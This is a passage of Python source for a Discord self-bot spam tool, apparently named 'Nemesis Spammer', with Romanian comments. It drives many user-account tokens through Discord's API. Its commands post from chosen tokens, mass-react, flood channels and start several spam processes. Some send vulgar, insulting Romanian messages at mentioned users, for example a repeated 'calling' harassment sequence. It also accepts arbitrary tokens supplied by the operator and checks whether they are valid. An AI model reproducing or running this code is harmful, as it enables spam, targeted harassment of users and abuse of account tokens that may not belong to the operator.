    tokenstreams.append(verified_token)
    big_text.append(verified_token)
    tokens_notepad.append(verified_token) 
    tokens_notepad2.append(verified_token) 
    tokens_afkcheck.append(verified_token)
    tokens_afkcheck2.append(verified_token)
    tokensreact.append(verified_token) 

#addnotepad
@client_multi_line_spam.command()
async def addnotepad(ctx, mata):
    await ctx.message.delete()
    if ctx.message.attachments:
        for attachment in ctx.message.attachments:
            if attachment.filename.endswith('.txt'):
                async with aiohttp.ClientSession() as session:
                    async with session.get(attachment.url) as resp:
                        if resp.status == 200:
                            continut = await resp.text()
                            fisier = f"{mata}"
                        with open(fisier, 'w') as muieakash:
                            muieakash.write(continut)

# extra commands for fun

#ship
@client_pentru_glumite.command()
async def ship(ctx, *user_mentions: discord.User):
    await pulamea(ctx, user_mentions)

#gay
@client_pentru_glumite.command()
async def gay(ctx, *user_mentions: discord.User):
    await pulamea2(ctx, user_mentions)

#hypesquad
@client_pentru_glumite.command()
async def hypesquad(ctx, count=None, hypesquad=None):
    count = int(count)
    count -= 1
    answers = ['bravery','brilliance','balance','briliance']
    await ctx.message.delete()
    nr = 0
    if hypesquad not in answers:
        return
    if hypesquad == "bravery":
        nr = 1
    elif hypesquad == "brilliance":
        nr = 2
    elif hypesquad == "balance":
        nr = 3
    elif hypesquad == "briliance":
        nr = 2
    x = requests.post(f"https://discord.com/api/v9/hypesquad/online", json={'house_id': nr},headers={"authorization": tokens[count]})
    status = x.status_code
    if status == 204:
        return
    else:
        await ctx.send("`Api denied request... please wait`")


#pula
@client_pentru_glumite.command()
async def pula(ctx, *user_mentions: discord.User):
    pule = ['8=>','8==>','8===>','8===>','8====>','8=====>','8======>','8=======>'
        ,'8========>',
        '8=========>',
        '8==========>','8===========>','8============>','8==>','8===>']
    headers={"authorization":token}
    canal = f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
    await ctx.message.delete()
    if user_mentions == () or user_mentions == "" or user_mentions == None or user_mentions == "" or user_mentions == [] or user_mentions == {}:
        mesaj = f"# <@{ctx.author.id}> are pula {random.choice(pule)}"
        requests.post(canal
                      ,headers=headers
                      ,json={"content":mesaj})
    else:
     mentions = ' '.join([mention.mention for mention in user_mentions])
     requests.post(canal
                   ,headers=headers
                   ,json={"content":f"# {mentions} are pula {random.choice(pule)}"})

#call
@client_pentru_glumite.command()
async def call(ctx, *user_mentions: discord.User):
    await ctx.message.delete()
    mentions = ' '.join([mention.mention for mention in user_mentions])
    headers={"authorization":token}
    canal = f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# calling {mentions}.........."})
    time.sleep(3)
    requests.post(canal 
                  ,headers=headers
                  ,json={"content":f"# alooooooooooo ;)))))))))))) {mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# ce faci ma prostule ai adormit {mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# ring ring sclavuleee ;))))))))))){mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# baaaaaaaaaaaaaaaa ;))))))) {mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# jvc praleooooo ;)))))))) {mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# TREZIREA FUTUTI GRIJANIA MATI :))))))))))) ALOOOO {mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# ring ring ;)))))))))) {mentions} "})

#say
@client_pentru_glumite.command()
async def say(ctx, count=None, *, mesaj123=None):
    count = int(count)
    mesaj123 = str(mesaj123)
    count -= 1
    canal = f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
    headers={"authorization":tokens[count]}
    await ctx.message.delete()
    requests.post(canal
                  ,headers=headers
                  ,json={"content":mesaj123})

#sayid
@client_pentru_glumite.command()
async def sayid(ctx, count=None, idcanal = None, *, mesaj123=None):
    count = int(count)
    mesaj123 = str(mesaj123)
    idcanal = int(idcanal)
    count -= 1
    canal = f'https://discord.com/api/v10/channels/{idcanal}/messages'
    headers={"authorization":tokens[count]}
    await ctx.message.delete()
    requests.post(canal
                  ,headers=headers
                  ,json={"content":mesaj123})


#afkcheck stop
@client_pentru_glumite.command()
async def afkcheckstop(ctx, count=None):
    count = int(count)
    count -= 1
    await ctx.message.delete()
    tokens_afkcheck[count] = False

#react 
@client_pentru_glumite.command()
async def react(ctx,count=None,channelid=None,messageid=None,emoji=None):
    count = int(count)
    count -= 1
    channelid = int(channelid)
    messageid = int(messageid)
    emoji = str(emoji)
    headers = {"Authorization":tokens6[count]}
    await ctx.message.delete()
    try:
     r = requests.put(f"https://discord.com/api/v9/channels/{channelid}/messages/{messageid}/reactions/{emoji}/@me", headers=headers)
    except Exception as e:
     pass


#finduser
@client_pentru_glumite.command()
async def finduser(ctx,text):
    text = str(text)
    listapuliimele = open('usernames2.txt','r').read().splitlines()
    await ctx.message.delete()
    try:
     morderas = int(listapuliimele.index(text))+1
     await ctx.send(f"# Username index: {morderas}")
    except Exception:
     await ctx.send("# Username not in list")

#validate
@client_pentru_glumite.command()
async def validate(ctx,tochenel):
    tochenel = str(tochenel)
    response = new_main_token_validation(tochenel)
    await ctx.message.delete()
    if response:
        await ctx.send("# Token has been succesfully validated")
    else:
        await ctx.send("# Token is invalid")

#saytoken
@client_pentru_glumite.command()
async def saytoken(ctx, toscan=None, *, mesaj123=None):
    toscan = str(toscan)
    response = new_main_token_validation(toscan)
    if not response:
        await ctx.send("# Token is invalid")
        return
    mesaj123 = str(mesaj123)
    canal = f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
    headers={"authorization":toscan}
    await ctx.message.delete()
    requests.post(canal
                  ,headers=headers
                  ,json={"content":mesaj123})

#saytokenid
@client_pentru_glumite.command()
async def saytokenid(ctx, toscan=None, idcanal = None, *, mesaj123=None):
    idcanal = int(idcanal)
    toscan = str(toscan)
    response = new_main_token_validation(toscan)
    if not response:
        await ctx.send("# Token is invalid")
        return
    mesaj123 = str(mesaj123)
    canal = f'https://discord.com/api/v10/channels/{idcanal}/messages'
    headers={"authorization":toscan}
    await ctx.message.delete()
    requests.post(canal
                  ,headers=headers
                  ,json={"content":mesaj123})
#reactall
@client_pentru_glumite.command()
async def reactall(ctx,channelid=None,messageid=None,emoji=None):
    channelid = int(channelid)
    messageid = int(messageid)
    emoji = str(emoji)
    await ctx.message.delete()
    for i in tokensreact:
     headers = {"Authorization":i}
     try:
      r = requests.put(f"https://discord.com/api/v9/channels/{channelid}/messages/{messageid}/reactions/{emoji}/@me", headers=headers)
      time.sleep(0.2)
     except Exception as e:
      pass

    
# global start & stop commands

#globalstart
@client_pentru_globale.command()
async def globalstart(ctx,*user_mentions:discord.User):
    tokens3[1] = True
    tokens4[1] = True
    tokens6[1] = True
    await ctx.message.delete()
    thred2 = threading.Thread(target=send_with_retry_startall4
                              ,args=(ctx,user_mentions)
                              ,daemon=True)
    thred3 = threading.Thread(target=send_with_retry_startall2
                              ,args=(ctx,user_mentions)
                              ,daemon=True)
    thred4 = threading.Thread(target=send_with_retry_startall
                              ,args=(ctx,user_mentions)
                              ,daemon=True)
    thred2.start()
    thred3.start()
    thred4.start()

#globalstop
@client_pentru_globale.command()
async def globalstop(ctx):
    tokens3[1] = False
    tokens4[1] = False
    tokens6[1] = False
    await ctx.message.delete()  

#globaltyping
@client_pentru_globale.command()
async def globaltyping(ctx, choice=None):
    await ctx.message.delete()
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    if choice in optiuniadv:
     tokensglobaltyping[0] = True
    elif choice in optiunineadv:
     tokensglobaltyping[0] = False
        
# initialize streaming script

youtube_link = "https://www.youtube.com/watch?v=Q7T01i-tgos"
default_stream_text = "solitude"
intents = discord.Intents.default()
intents.presences = True 

@client_streaming.command()
async def stream(ctx, *, stream_text):
    await client_streaming.change_presence(activity=discord.Streaming(name=stream_text
                                           , url=youtube_link)
                                           , status=discord.Status.dnd)
    await ctx.message.delete()

#streamtoken command logic

async def start_bot(token,text1):
    bot = commands.Bot(command_prefix=']')
    youtube_link = "https://www.youtube.com/watch?v=Q7T01i-tgos"
    intents = discord.Intents.default()
    intents.presences = True 
    @bot.event
    async def on_ready():
     await bot.change_presence(activity=discord.Streaming(name=text1
                               , url=youtube_link)
                               , status=discord.Status.dnd)
    await bot.start(token, bot=False)

async def run_bots(tochenut,text1):
    tasks = []
    tasks.append(asyncio.create_task(start_bot(tochenut,text1)))
    await asyncio.gather(*tasks)

# streamall command logic

async def strtbot(tochennnn,strimtext):
    bot25 = commands.Bot(command_prefix=']')
    youtube_link = "https://www.youtube.com/watch?v=Q7T01i-tgos"
    intents = discord.Intents.default()
    intents.presences = True 
    @bot25.event
    async def on_ready():
     await bot25.change_presence(activity=discord.Streaming(name=strimtext
                                 , url=youtube_link)
                                 , status=discord.Status.dnd)
    await bot25.start(tochennnn, bot=False)

async def strmall(strimtext):
    tasks223 = []
    for tochennnn in tokenstreams:
        if tochennnn == tokenstreams[0]:
            continue
        tasks223.append(asyncio.create_task(strtbot(tochennnn,strimtext)))
    await asyncio.gather(*tasks223)

# prepare clients to be ran

def run_single_line_spam(t,tolcenken):
    client_single_line_spam.run(tolcenken, bot=False)   
def run_multi_line_spam(t,tolcenken):
    client_multi_line_spam.run(tolcenken, bot=False)
def run_repeated_message_spam(t,tolcenken):
    client_repeated_message_spam.run(tolcenken, bot=False)
def run_spiced_multi_line_spam(t,tolcenken):
    client_spiced_multi_line_spam.run(tolcenken, bot=False)
def run_glumite(t,tolcenken):
    client_pentru_glumite.run(tolcenken,bot=False)
def run_streaming(t,tolcenken):
    client_streaming.run(tolcenken,bot=False)
def run_globale(t,tolcenken):
    client_pentru_globale.run(tolcenken,bot=False)

# streaming command clients

def asyncio_run(tochenut,text1):
    asyncio.run(run_bots(tochenut,text1))
def mata_run(tolen,strimtext):
    asyncio.run(strmall(strimtext))

# initialize streamtoken command

@client_streaming.command()
async def streamtoken(ctx, count=None, *, text=None):
    count = int(count)
    if count == 1:
        return
    count -= 1
    asyncio_process = threading.Thread(target=asyncio_run
                                       ,args=(tokens[count],text)
                                       ,daemon=True)
    asyncio_process.start()
    await ctx.message.delete()

# initialize streamall command

@client_streaming.command()
async def streamall(ctx, *, strimtext=None):
    strimtext = str(strimtext)
    tolen = ""
    asyncio_process22 = threading.Thread(target=mata_run
                                         ,args=(tolen,strimtext)
                                         ,daemon=True)
    asyncio_process22.start()
    await ctx.message.delete()

# initialize all scripts and display menu

if __name__ == '__main__':
        clear_log_file()
        print(fade.fire(text))
        new_token = main_token_validation()
        check_blacklist(new_token)
        for k in tokens:
         check_blacklist(k)
        print(f"{Fore.GREEN}{len(tokens)} tokens verified succesfully {Style.RESET_ALL}")
        if invalid_tokens == 0:
            print(f"{Fore.GREEN}All tokens in tokens.txt are valid{Style.RESET_ALL}")
        elif invalid_tokens == 1:
            print(f"{Fore.RED}1 invalid token found{Style.RESET_ALL}")
            print(f"{Fore.RED}---Invalid token:---")
            print(invalid_tokens_list[0])
            {Style.RESET_ALL}
        else:
            print(f"{Fore.RED}{invalid_tokens} invalid tokens found{Style.RESET_ALL}")
            print(f"{Fore.RED}---List of invalid tokens--")
            for invalid_tokchens in invalid_tokens_list:    
                print(invalid_tokchens)
                {Style.RESET_ALL}
        try:
         mainusername = discord_username(new_token)
         #ctypes.windll.kernel32.SetConsoleTitleW(f'[Nemesis Spammer] | Welcome | Account: {mainusername}')
        except Exception:
            pass
        print(f"{Fore.GREEN}Starting scripts......{Style.RESET_ALL}")
        def interpolate_color(start_color, end_color, t):
         start_hsv = [c / 255.0 for c in start_color]
         end_hsv = [c / 255.0 for c in end_color]
         interpolated_hsv = [start + t * (end - start) for start, end in zip(start_hsv, end_hsv)]
         return tuple(int(c * 255) for c in interpolated_hsv)
        def custom_loading_bar(number, start_color, end_color):
            t = number / 100.0
            color = interpolate_color(start_color, end_color, t)
            color_code = f"\x1b[38;2;{color[0]};{color[1]};{color[2]}m"
            bar_length = 70  # Adjust the length of the bar here
            bar = f"[{'#' * (number * bar_length // 100)}{' ' * (bar_length - (number * bar_length // 100))}]"
            return f"{color_code}{bar} {number}%\x1b[31m"
        total_numbers = 100
        color_combinations = [
            ((80, 0, 255), (255, 0, 0))
        ]
        for start_color, end_color in color_combinations:
            for i in range(1, total_numbers + 1):
                time.sleep(0.01)
                loading_bar = custom_loading_bar(i, start_color, end_color)
                print(f"\r{loading_bar}", end='', flush=True)
        #thredupdeit = threading.Thread(target=update_title,args=("0",mainusername),daemon=True)
        #thredupdeit.start()
        log("MAIN SCRIPT SUCCCESFULLY STARTED")
        log("LOG FINISHED.......")
        single_line_spam_process = multiprocessing.Process(target=run_single_line_spam,args=("0",new_token))
        multi_line_spam_process = multiprocessing.Process(target=run_multi_line_spam,args=("0",new_token))
        repeated_message_spam_process = multiprocessing.Process(target=run_repeated_message_spam,args=("0",new_token))
        spiced_multi_line_spam_process = multiprocessing.Process(target=run_spiced_multi_line_spam,args=("0",new_token))
        streaming_thread = multiprocessing.Process(target=run_streaming,args=("0",new_token))
        glumite_process = multiprocessing.Process(target=run_glumite,args=("0",new_token))
        globale_process = multiprocessing.Process(target=run_globale,args=("0",new_token))
        globale_process.start()
        glumite_process.start()
        streaming_thread.start()
        single_line_spam_process.start()
        multi_line_spam_process.start()
        repeated_message_spam_process.start()
        spiced_multi_line_spam_process.start()
        print(f"\n{Fore.GREEN}All scripts have been succesfully started.{Style.RESET_ALL}")
             
# script version 22/02/2024 [ PREMIUM ]
# made by @clixyy // @clixyofficial

# COPYRIGHT NEMESIS© ALL RIGHTS SERVED
